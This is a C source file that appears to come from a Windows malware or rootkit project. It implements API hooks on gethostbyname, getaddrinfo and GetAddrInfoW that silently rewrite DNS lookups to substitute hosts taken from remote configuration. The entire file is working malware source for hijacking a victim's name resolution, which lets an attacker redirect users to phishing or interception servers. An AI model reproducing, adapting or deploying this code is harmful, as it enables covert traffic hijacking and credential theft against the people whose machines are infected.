#include "dns_redirect.h"

#ifdef MODULE_ROOTKIT
#include <Winsock2.h>
#include <Windows.h>

#include "dynamicconfig.h"
#include "../common/string.h"
#include "../common/mem.h"

ptgethostbyname ogethostbyname;

static void _ParseInOutDNS(const LPSTR pszArguments, LPSTR* pszIn, LPSTR* pszOut)
{
	DWORD dwIndex, dwCount;
	LPSTR* ppszData;

	if((dwIndex = StrIndexOfCharA(pszArguments, '=')) == -1)
		return;

	if((dwCount = CharCountA(pszArguments, '=')) != 2)
		return;

	if((ppszData = SplitString(pszArguments, '=', dwCount)) == NULL)
		return;

	*pszIn = StrCopyA(ppszData[0], StrLengthA(ppszData[0]));
	*pszOut = StrCopyA(ppszData[1], StrLengthA(ppszData[1]));

	memfree(ppszData);
}

static BOOL _IsDNSReplaced(const LPSTR pszDNS, LPSTR* ppszReplace)
{
	BOOL bIsReplace;
	config_t* pConfigs;
	DWORD dwCount, i;
	LPSTR pszIn, pszOut;

	if((pConfigs = GetConfigsByType(DNS_REDIRECT, &dwCount)) == NULL)
		return FALSE;

	bIsReplace = FALSE;

	for(i = 0; i < dwCount; i++)
	{
		pszIn = NULL;
		pszOut = NULL;

		_ParseInOutDNS(pConfigs[i].pszArguments, &pszIn, &pszOut);

		if(pszIn == NULL || pszOut == NULL)
			break;

		if(StrCompareStartA(pszDNS, pszIn))
		{
			if((*ppszReplace = StrCopyA(pszOut, StrLengthA(pszOut))) != NULL)
				bIsReplace = TRUE;

			break;
		}
	}

	return bIsReplace;
}

struct hostent* WINAPI gethostbyname_Callback(const char *name)
{
	LPSTR pszDNS = NULL;

	if(!_IsDNSReplaced(name, &pszDNS))
		pszDNS = name;

	return ogethostbyname(pszDNS);
}

ptgetaddrinfo ogetaddrinfo;

int WINAPI getaddrinfo_Callback(PCSTR      pNodeName,
								PCSTR      pServiceName,
								const ADDRINFOA  *pHints,
								PADDRINFOA *ppResult)
{
	LPSTR pszDNS;

	if(!_IsDNSReplaced(pNodeName, &pszDNS))
		pszDNS = pNodeName;

	return ogetaddrinfo(pszDNS, pServiceName, pHints, ppResult);
}

ptGetAddrInfoW oGetAddrInfoW;

int WINAPI GetAddrInfoW_Callback(	       PCWSTR     pNodeName,
								 PCWSTR     pServiceName,
								 const ADDRINFOW  *pHints,
								 PADDRINFOW *ppResult)
{
	LPSTR pszDNS, pszNewDNS;
	LPWSTR pwzNewDNS;
	int iReturn = -1;

	if((pszDNS = unicodeToAnsiEx(pNodeName, StrLengthW(pNodeName))) != NULL)
	{
		if(_IsDNSReplaced(pszDNS, &pszNewDNS))
		{
			pwzNewDNS = ansiToUnicodeEx(pszNewDNS, StrLengthA(pszNewDNS));
		}
	}
	
	iReturn = oGetAddrInfoW(pwzNewDNS == NULL ? pNodeName : pwzNewDNS, pServiceName, pHints, ppResult);

	if(pszDNS != NULL)
		memfree(pszDNS);

	if(pszNewDNS != NULL)
		memfree(pszNewDNS);

	if(pwzNewDNS != NULL)
		memfree(pwzNewDNS);

	return iReturn;
}

#endif